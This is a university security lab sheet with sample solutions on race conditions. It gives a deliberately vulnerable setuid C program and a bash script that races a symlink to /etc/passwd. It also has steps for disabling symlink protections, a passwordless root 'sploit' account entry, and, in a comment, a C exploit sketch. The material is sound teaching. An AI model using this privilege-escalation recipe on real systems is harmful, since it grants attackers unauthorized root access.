---
title:  CITS3007 lab 8 (week 9)&nbsp;--&nbsp;Race conditions&nbsp;--&nbsp;solutions
---

This lab explores *race condition* vulnerabilities.
A race condition is any situation
where the timing or order of events affects the correctness of
programs or code. For a race condition to occur,
some form of *concurrency* must exist -- e.g., multiple processes running
at the same time -- and it occurs when the same data
is accessed and written by multiple processes.
If a setuid program has a
race-condition vulnerability, then attackers can run a parallel process
and attempt to change the the program behaviour.

<!--
This lab covers the following topics:

- Race condition vulnerability
- Sticky symlink protection
- Principle of least privilege

-->

## 1. Symbolic links and preparation

<!--
lab questions to add

Checkpoint 1. What is a race condition?
Checkpoint 2. What is the general target for race condition attacks?
Checkpoint 3. What is the TOCTTOU (Time Of Check To Time Of Use) design flaw?
Checkpoint 4. What is the relationship between TOCTTOU design flaw and the race condition attack?
Checkpoint 5. Explain if a race condition is always guaranteed to succeed.
Checkpoint 6. What is a symlink / path attack?
Checkpoint 7. How is a symlink / path attack related to a race condition?
-->

Recent versions of Ubuntu (10.10 and later) come with a built-in protection
against some race condition attacks. Specifically, they mitigate against some
symbolic link (symlink)
attacks (which we saw in lectures).

In the CITS3007 development environment, we will create a new user
(in addition to the "`vagrant`" user we log in as) with their own
home directory:

```
$ sudo adduser --disabled-password --gecos '' user2
```

As that user, we'll create a new file and a symlink to it:


```
$ sudo su user2 -c 'echo hello > /home/user2/file'
$ sudo su user2 -c 'ln -s /home/user2/file /home/user2/link'
```

By default, a user's new files are world readable, so the `vagrant`
user can read the file and the symlink:

```
$ ls -l ~user2
total 4
-rw-rw-r-- 1 user2 user2  6 Sep 27 00:31 file
lrwxrwxrwx 1 user2 user2 16 Sep 27 00:32 link -> /home/user2/file
$ cat /home/user2/file
hello 
```

Note that the permissions of the symlink are "`rwx`" for user, group
and the "world" -- this is because on Linux, symlinks have no
"permissions" of their own; permissions are taken from the file being
linked to.

As `user2`, we'll try removing "world" permissions from the symlink:

```
$ sudo su user2 -c 'chmod o-r /home/user2/link'
```

Does this make a difference to the permissions of the `link` file,
as displayed by `ls`? Can the `vagrant` user still access it?



<div class="solutions">

**Sample solutions**

You should observe that the listed permissions stay exactly
the same, and the `vagrant` user can still read the file contents.

</div>



Now we'll try making a symlink again, but putting it in the `/tmp` directory:

```
$ sudo su user2 -c 'ln -s /home/user2/file /tmp/link'
```

What happens if you execute the command `cat /tmp/link` (as the `vagrant user`)?



<div class="solutions">

**Sample solutions**

You should observe that a "Permission denied" error occurs.

</div>



The `tmp` directory has special permissions, on Unix-like systems. Run `ls -ld /tmp`,
and you should see output like the following:

```
$ ls -ld /tmp
drwxrwxrwt 12 root root 4096 Sep 27 00:38 /tmp
```

The "`t`" at the end of the permissions means a permission bit called the "sticky bit"
has been set for the `/tmp` directory.
When this bit is set on a directory, and some user creates a file in it,
other users (except for the owner of the directory, and of course `root`) are
prevented from deleting or renaming the file.

<!--
  TODO: exercise showing this
-->
 
The sticky bit is set on the `/tmp` directory to ensure one user's temporary
files can't be renamed or deleted by other users.
In addition to this, the Linux kernel introduced [additional protections][linux-symlinks]:
symbolic links in world-writable sticky directories (such as `/tmp`) can *only be followed*
if the follower (i.e., the user executing a command) and the directory owner (that is,
`root`, in the case of the `/tmp` directory) match the symlink owner.

[linux-symlinks]: https://lwn.net/Articles/390323/

<!--
  TODO: exercise showing this
-->

(Note that these built-in protections are **not** sufficient security for safely
creating temporary files. It's usually best to ensure that only the actual user
of a process
can even list or read temporary files: a program should create its own temporary
*directory* under `/tmp`, to which only the actual user has read, write or execute
access, and then create needed temporary files within that directory.)
 
In this lab, we need to disable this protection:

```
$ sudo sysctl -w fs.protected_symlinks=0
```

We also need to disable another protection, added in Ubuntu 20.04:
even root cannot write to files in `/tmp` that are owned by others.

```
$ sudo sysctl fs.protected_regular=0
```

<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">

**Linux security modules**

In earlier versions of the Linux kernel (for instance,
on Ubuntu 12.04), the "symlinks in sticky-bit directories" protection
was provided by a Linux security module called "Yama", and
could be disabled using the following command:

```
$ sudo sysctl -w kernel.yama.protected_sticky_symlinks=0
```

The Linux kernel provides a security framework consisting of various "hooks"
which can be used by Linux security *modules*. For instance, normally
in the Linux kernel, read permissions for a file are only checked
when a file is opened.
However, the security framework provides 
"file hooks" which allow security modules to specify checks which
should be made whenever a read or write is performed on a file descriptor
(for example, to revalidate the file permissions in case they have changed).

We will not look in detail at how the security framework and
modules work, but if you are interested,
the architecture of the framework is described in a [2002 paper][linux-sec],
and a guide to some of the modules is provided [here][linux-sec-guide].

[linux-sec]: https://www.usenix.org/legacy/event/sec02/wright.html
[linux-sec-guide]: https://www.starlab.io/blog/a-brief-tour-of-linux-security-modules 

<!--
  "Yama" appears to be named after the Hindu deity: <https://lwn.net/Articles/393008/>
-->


A list of the currently enabled Linux security modules can be printed by
running

```
$ cat /sys/kernel/security/lsm
```

In more recent kernels, the "symlinks in sticky-bit directories" protection
is built into the kernel.

</div>

### 1.2. A vulnerable setuid program

Consider the following program, `append.c`:

```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main() {
  char * filename = "/tmp/XYZ";
  char buffer[60];
  FILE *fp;

  // get user input
  printf("text to append to '%s': ", filename);
  fflush(stdout);

  scanf("%50s", buffer );

  // does `filename` exist, and can the actual user write
  // to it?
  if (!access(filename, W_OK)) {
    fp = fopen(filename, "a+");
    fwrite("\n", sizeof(char), 1, fp);
    fwrite(buffer, sizeof(char), strlen(buffer), fp);
    fclose(fp);
    exit(0);
  }

  printf("No permission\n");
  exit(1);
}
```

It's intended to be a root-owned setuid program, which takes a string
of input from a user, and appends it to the end of a temporary file
`/tmp/XYZ` (if that file exists) -- but only if the user who runs the
program would normally have permissions to write to the file.
Because the program runs with root privileges (i.e., has an effective
user ID of `0`), it normally could overwrite any file. Therefore,
the code above uses the `access` function (discussed in lectures)
to ensure the *actual* user running the program has the correct
permissions.

Save the program as `append.c`, and compile it with `make append.o append`.
Then make it a root-owned setuid program:

```
$ sudo chown root:root append
$ sudo chmod u+s append
```

At first glance the program may not seem to have any problem.
However, there is a race condition vulnerability in the program --
specifically, a "TOCTOU" vulnerability.
Due to the time window between the file permissions check (`access()`)
and the file use (`fopen()`),
there is a possibility that the file used by `access()` is different from the file used by `fopen()`, even
though they have the same file name `/tmp/XYZ`.
If a malicious attacker can somehow make `/tmp/XYZ`
a symbolic link pointing to a protected file, such as `/etc/passwd`, inside the time window, the attacker
can cause the user input to be appended to `/etc/passwd` and as a result gain root privileges.

### 1.3. Targeting `/etc/passwd`

We would like to exploit the race condition vulnerability in the vulnerable program, and target
the password file `/etc/passwd`, which is not writable by normal users.
We will try to add a record to the password file, with a goal of creating a new user account that has
root privileges. Take a look at the `/etc/passwd` file by running `less /etc/passwd`.

Inside the password file, each user has an entry, which consists of seven fields separated by
colons (:).
The entry for the root user is as follows:

```
  root:x:0:0:root:/root:/bin/bash
```

The fields are as follows (`man 5 passwd` gives the details):

- The first field is the user's login name.
- The second field
  indicates if the user account has a normal password or not -- the "`x`"
  indicates that root user has a password stored in the `/etc/shadow`  file.
- The next two fields are the user's user ID and
  group ID -- note that there is nothing to stop multiple records in `/etc/passwd` having
  the same user ID and group ID. (If that is the case,
  multiple user *names* will be able to access the same privileges and permissions.)
- The fifth field is the user's full name and contact details.[^gecos-fn]
- The sixth field is the login shell.

[^gecos-fn]: Called the ["GECOS" field][gecos-field], for historical reasons --
  the name [was taken from][gecos-history] an operating system called
  the General Electric Comprehensive Operating System (GECOS). 

[gecos-field]: https://en.wikipedia.org/wiki/Gecos_field
[gecos-history]: https://www.redhat.com/sysadmin/linux-gecos-demystified 

Root's privileges don't come from its name ("`root`"), but from its user ID, 0.
To create an account with root privileges, we just need to append a record to
`/etc/passwd` that has a 0 in the third field.

How will we be able to make use of this new root-privileged user? Let's suppose
the new account is called `sploit`. We will want to be able to log into the `sploit`
account. We could create a line in `/etc/passwd` that looks
like the following:


```
  sploit:x:0:0::/root:/bin/bash
```

Because the `x` in the second field means there's a password (actually,
a *hash* of the password) in `/etc/shadow`, we'd need to add a line
to `/etc/shadow` as well, containing a hash of our desired password.
This isn't too difficult to do, but an easier way would be to instead
put the hash of our password in `/etc/passwd`, in place of the `x`.
Normally, this is considered bad practice and insecure on Unix systems,
because `/etc/passwd` is world-readable;[^etc-passwd-perms]
but as an attacker, we probably don't care much about preserving the security
of the system we're attacking.

On Ubuntu systems, there is an easier method yet. A particular "magic" password value
is used for [passwordless guest accounts][guest],
and the magic value is `U6aMy0wojraho` (the
6th character is zero, not letter O).
If we put this value in the password field of a user entry, we can just 
hit the return key when prompted for a password, and we can log into the user's
account.

So our attack should write an entry like the `sploit` user entry
above, but instead of "`x`", we can use the magic value given above,
and we will be able to log in to the `sploit` account without
a password -- for instance, by running `su sploit`.

[guest]: https://help.ubuntu.com/community/PasswordlessGuestAccount

<!--

```
  sploit:U6aMy0wojraho:0:0::/root:/bin/bash
```

-->

[^etc-passwd-perms]: `/etc/passwd` being world-readable doesn't
  mean everyone can simply *read* the passwords -- recall that
  we don't store actual passwords, but only hashes of them.\
  &nbsp; &nbsp; But it *does* mean that anyone who wanted could
  take a copy of the `/etc/passwd` file and try to "crack" the passwords
  (try many combinations, in hopes of finding the correct one) at their
  leisure,
  using a program like [John the Ripper][john].

[john]: https://www.openwall.com/john/


### 1.3. Launching the race condition attack

In order to successfully exploit the `append` program, we need to
make `/tmp/XYZ` point to the password file.
In order for this critical step to succeed, it has to
occur within the window between check and use (i.e., between the `access()` and the `fopen()`
calls in the vulnerable program). 
We assume we cannot modify the vulnerable program, so the only thing that we can
do is to run our attacking program in parallel to "race" against the target program, hoping to win the race
condition, i.e., changing the link within that critical window.
We can't achieve the perfect timing needed for this every time we try, but
given many attempts, we may be able to succeed.

Consider how we can increase the probability. For example, we can
run the vulnerable program for many times; we only need to achieve success once among all these trials.
Since you need to run the attacks and the vulnerable program for many times, you need to write a
program to automate the attack process. To avoid manually typing an input to the vulnerable program
`append`, you can use input redirection.

Try saving the following file as `launch.sh`, and give it executable permissions:

```bash
#!/usr/bin/env bash

# You can adjust LIMIT to change
# the number of times the loop runs.
LIMIT=1

# uncommenting the following line will print
# each command as it executes:
#set -x

orig_file=/tmp/XYZ
target_file=/etc/passwd

for ((i=0; i < LIMIT; i=i+1)); do
  rm -rf $orig_file
  touch $orig_file
  # replace AAA with the text you want appended to /etc/passwd
  (echo 'AAA' | nice -n 19 ./append) &
  unlink $orig_file
  ln -s $target_file $orig_file
  # replace BBB with some string that will be found
  # if your attack is successful.
  # if you insert a `sleep()` in the append
  # program, you'll also want to add a sleep command
  # (see `man 1 sleep`)
  # here, so your check waits til append has completed.
  if grep 'BBB' $target_file > /dev/null; then
    echo "attack succeeded"
    exit 0
  fi
done

echo "attack failed"
exit 1
```

If you give this program a higher `LIMIT` and run it, you likely will still not see
success -- so we need to make our attack *faster*, and `./append` slower. What
ways are there of doing so?

To show that this sort of attack *can* work, you might like to insert the following
line (which calls the `sleep()` function, see `man 3 sleep`) --

```
  sleep(1);
```

into `append.c`, before the call to `open()`, then recompile `append`
and run the `bash` script against it.

But a successful exploit of this
vulnerability should be able to (when run sufficiently many times) take
advantage of the original `append` program, even without the call to `sleep()`.

Hint: a C program will be much faster than the Bash script above, and
the following C functions can be used to unlink (delete) a file
and create a symlink:

```C
#define _POSIX_C_SOURCE 200112L

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

void somefunc() {
  unlink("file-to-delete.txt");
  symlink("src-file", "target-file");
}
```

You should also know from previous classes how to use the `system()`
call to run any other shell commands you want to.

 

<!--

C:
rm -rf *.o launch && make CC=gcc CFLAGS="-std=c11 -pedantic -O3 -Wall -Wextra" launch.o launch

man 2 unlink, man 3 symlink

```
#define _POSIX_C_SOURCE 200112L

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h> 


int main(int argc, char ** argv) {
  system("rm -rf /tmp/XYZ; touch /tmp/XYZ");
  system("(echo AAA | nice -n 19 ./append) &");
  unlink("/tmp/XYZ");
  symlink("/etc/passwd", "/tmp/XYZ");
  system("tail -n 1 /etc/passwd");
}

```


-->



<div class="solutions">

**Sample solutions**

A solution program in C is not provided, but you should be able to
work out what it would look like. The ultimate goal of this lab in
any case is not to come up with exactly the same exploit program
as other people might,
but rather to understand the nature of TOCTOU vulnerabilities.

</div>



<!-- vim: syntax=markdown
-->

